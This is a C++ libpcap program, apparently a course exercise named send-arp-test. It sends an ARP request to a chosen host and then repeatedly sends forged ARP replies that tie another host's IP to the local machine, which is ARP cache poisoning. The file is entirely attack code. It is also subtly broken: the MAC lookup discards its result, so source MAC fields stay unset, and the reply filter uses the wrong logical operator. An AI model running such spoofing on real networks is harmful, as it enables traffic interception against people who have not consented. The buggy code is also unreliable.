#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void get_mac(char *dev)
{
    struct ifreq ifr;
    uint8_t my_mac[Mac::SIZE];
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(fd == -1) {
        printf("socketopen error\n");
        exit(0);
    }

    strcpy(ifr.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        memcpy(&my_mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    }
    else {
        printf("interface error");
        exit(0);
    }
}

char* get_ip(char *dev)
{
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < -1) {
        perror("socketopen error\n");
        exit(0);
    }

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if(ioctl(fd, SIOCGIFADDR, &ifr)<0)
    {
        perror("ioctl error\n");
        exit(0);
    }
    else
    {
        return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    }
    close(fd);
}


#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> sender_ip target_ip\n");
    printf("sample: send-arp-test wlan0 192.168.135.164 192.168.135.2\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    char *sender_ip = argv[2];
    char *target_ip = argv[3];
    EthArpPacket request_packet;


    memset(&request_packet.eth_.dmac_, 0xff, Mac::SIZE);
    get_mac(dev);
    request_packet.eth_.type_ = htons(EthHdr::Arp);
    request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    request_packet.arp_.pro_ = htons(EthHdr::Ip4);
    request_packet.arp_.hln_ = Mac::SIZE;
    request_packet.arp_.pln_ = Ip::SIZE;
    request_packet.arp_.op_ = htons(ArpHdr::Request);

    get_mac(dev);
    request_packet.arp_.sip_=htonl(Ip(get_ip(dev)));

    memset(&request_packet.arp_.tmac_, 0x00, Mac::SIZE);
    request_packet.arp_.tip_=htonl(Ip(sender_ip));


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while(true) {
            struct pcap_pkthdr* header;
            const u_char* reply_packet;
            int res = pcap_next_ex(handle, &header, &reply_packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }

            struct EthArpPacket *etharp = (struct EthArpPacket *)reply_packet;
            if(etharp->eth_.type_!=htons(EthHdr::Arp) && etharp->arp_.op_!=htons(ArpHdr::Reply) && etharp->arp_.sip_!=htonl(Ip(sender_ip))) continue;

            memcpy(&request_packet.eth_.dmac_, &etharp->eth_.smac_, Mac::SIZE);
            memcpy(&request_packet.arp_.tmac_, &etharp->arp_.smac_, Mac::SIZE);
            request_packet.arp_.op_=htons(ArpHdr::Reply);
            request_packet.arp_.sip_=htonl(Ip(target_ip));

            for(int i=0; i<3; i++) {
                 int repacket = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
                 if (repacket != 0) {
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
            }
    }
    pcap_close(handle);
}
